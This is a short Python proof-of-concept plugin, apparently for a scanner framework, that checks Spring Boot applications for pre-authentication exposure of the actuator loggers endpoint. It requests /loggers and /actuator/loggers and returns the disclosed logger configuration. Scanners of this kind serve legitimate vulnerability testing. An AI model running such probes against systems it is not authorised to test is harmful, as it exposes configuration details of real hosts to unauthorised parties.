...
class DemoPOC(POCBase):
    ...
    references = []
    name = 'springboot springboot Pre-Auth loggers Information Disclosure'
    appPowerLink = ''
    appName = 'springboot'
    appVersion = ''
    ...
    def _exploit(self):
        result = {}
        paths=["/loggers","/actuator/loggers"]
        for  path in paths:
            res = requests.get(urljoin(self.url,path), headers=self.headers)
            logger.debug(res.text)
            if '"loggers"' in res.text and '"levels"' in res.text and "application" in res.text:
                return res.text
